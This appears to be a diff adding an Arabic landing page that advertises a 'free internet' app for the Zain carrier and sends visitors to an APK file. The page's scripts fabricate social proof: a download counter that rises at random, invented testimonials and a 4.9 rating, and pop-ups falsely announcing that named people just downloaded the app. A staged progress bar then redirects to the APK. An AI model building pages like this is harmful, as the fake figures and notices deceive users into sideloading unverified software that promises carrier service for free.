@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>تحميل تطبيق نت مجاني زين 2025 | أسرع إنترنت</title>
+
+<meta name="description" content="تحميل أقوى تطبيق نت مجاني لزين وكل الشبكات بواجهة احترافية وتجربة خرافية.">
+<meta name="keywords" content="نت مجاني, زين, تحميل تطبيق, انترنت مجاني, zain free net">
+
+<style>
+:root{
+  --main:#00ffcc;
+  --bg:#020409;
+  --glass:rgba(255,255,255,0.08);
+}
+
+*{
+  box-sizing:border-box;
+  font-family:Segoe UI,Tahoma;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:radial-gradient(circle at top,#0a1a2f,#020409);
+  color:#fff;
+  overflow-x:hidden;
+}
+
+/* ===== إطار حي ===== */
+.frame{
+  position:fixed;
+  inset:10px;
+  border-radius:35px;
+  pointer-events:none;
+  z-index:1;
+}
+
+.frame::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  border-radius:35px;
+  padding:2px;
+  background:linear-gradient(120deg,var(--main),transparent,var(--main));
+  -webkit-mask:
+    linear-gradient(#000 0 0) content-box,
+    linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor;
+  animation:borderMove 6s linear infinite;
+}
+
+@keyframes borderMove{
+  to{background-position:400%;}
+}
+
+/* ===== خلفية جزيئات ===== */
+.particles span{
+  position:fixed;
+  width:6px;
+  height:6px;
+  background:var(--main);
+  opacity:.25;
+  border-radius:50%;
+  animation:fly 18s linear infinite;
+}
+
+@keyframes fly{
+  from{transform:translateY(100vh) scale(.3);}
+  to{transform:translateY(-10vh) scale(1);}
+}
+
+/* ===== حاوية ===== */
+.container{
+  max-width:1100px;
+  margin:auto;
+  padding:60px 20px;
+  position:relative;
+  z-index:2;
+}
+
+/* ===== كرت رئيسي ===== */
+.hero{
+  background:var(--glass);
+  backdrop-filter:blur(18px);
+  border-radius:30px;
+  padding:60px 30px;
+  text-align:center;
+  box-shadow:0 0 70px rgba(0,255,204,.25);
+}
+
+.hero h1{
+  font-size:clamp(30px,5vw,52px);
+}
+
+.hero p{
+  color:#cfefff;
+  font-size:clamp(15px,3vw,19px);
+  margin:20px 0 40px;
+}
+
+/* ===== زر تحميل ===== */
+.download-btn{
+  background:linear-gradient(135deg,#00ffcc,#00bfff);
+  color:#000;
+  border:none;
+  padding:22px 55px;
+  font-size:22px;
+  border-radius:60px;
+  cursor:pointer;
+  box-shadow:0 0 45px rgba(0,255,204,.9);
+  transition:.3s;
+}
+
+.download-btn:hover{
+  transform:scale(1.12);
+}
+
+/* ===== شريط تقدم ===== */
+.progress-box{
+  width:100%;
+  max-width:420px;
+  margin:25px auto 0;
+  background:rgba(255,255,255,.1);
+  border-radius:20px;
+  overflow:hidden;
+  display:none;
+}
+
+.progress{
+  height:14px;
+  width:0%;
+  background:linear-gradient(90deg,var(--main),#00bfff);
+  transition:.3s;
+}
+
+/* ===== إحصائيات ===== */
+.stats{
+  display:flex;
+  justify-content:space-around;
+  flex-wrap:wrap;
+  margin-top:45px;
+}
+
+.stat span{
+  font-size:34px;
+  color:var(--main);
+  display:block;
+}
+
+/* ===== آراء ===== */
+.social{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+  gap:20px;
+  margin-top:60px;
+}
+
+.card{
+  background:rgba(255,255,255,.06);
+  padding:20px;
+  border-radius:20px;
+}
+
+/* ===== نافذة ===== */
+.modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.6);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:5;
+}
+
+.modal-box{
+  background:#0a1a2f;
+  padding:35px;
+  border-radius:25px;
+  text-align:center;
+  max-width:420px;
+}
+
+.modal-box h3{
+  color:var(--main);
+}
+
+/* ===== إشعار ===== */
+.toast{
+  position:fixed;
+  bottom:25px;
+  left:25px;
+  background:rgba(0,0,0,.75);
+  padding:15px 20px;
+  border-radius:15px;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="frame"></div>
+
+<div class="particles">
+  <!-- توليد 30 نقطة -->
+  <script>
+    for(let i=0;i<30;i++){
+      document.write('<span style="left:'+Math.random()*100+'%;animation-delay:'+Math.random()*10+'s"></span>');
+    }
+  </script>
+</div>
+
+<div class="container">
+  <div class="hero">
+    <h1>أقوى تطبيق نت مجاني لزين وكل الشبكات</h1>
+    <p>واجهة احترافية • سرعة عالية • تجربة مستخدم خرافية</p>
+
+    <button class="download-btn" onclick="startDownload()">
+      تحميل التطبيق
+    </button>
+
+    <div class="progress-box" id="box">
+      <div class="progress" id="bar"></div>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><span id="users">25640</span> مستخدم</div>
+      <div class="stat"><span>4.9★</span> تقييم</div>
+      <div class="stat"><span>Android</span> مدعوم</div>
+    </div>
+  </div>
+
+  <div class="social">
+    <div class="card"><b>أحمد:</b> أسرع نت شفته.</div>
+    <div class="card"><b>سارة:</b> واجهة تخبل.</div>
+    <div class="card"><b>خالد:</b> يستاهل التحميل.</div>
+  </div>
+</div>
+
+<div class="modal" id="modal">
+  <div class="modal-box">
+    <h3>جاهز للتحميل</h3>
+    <p>سيبدأ التحميل الآن</p>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+function startDownload(){
+  let box=document.getElementById("box");
+  let bar=document.getElementById("bar");
+  box.style.display="block";
+  let p=0;
+  let i=setInterval(()=>{
+    p+=5;
+    bar.style.width=p+"%";
+    if(p>=100){
+      clearInterval(i);
+      document.getElementById("modal").style.display="flex";
+      setTimeout(()=>{
+        window.location.href="zain enternet_6.7.apk";
+      },1200);
+    }
+  },120);
+}
+
+setInterval(()=>{
+  let u=document.getElementById("users");
+  u.innerText=parseInt(u.innerText)+Math.floor(Math.random()*4);
+},4000);
+
+const names=["محمد","منى","علي","نور"];
+setInterval(()=>{
+  let t=document.getElementById("toast");
+  t.innerText=names[Math.floor(Math.random()*names.length)]+" حمّل التطبيق الآن";
+  t.style.display="block";
+  setTimeout(()=>t.style.display="none",3000);
+},7000);
+</script>
+
+</body>
+</html>
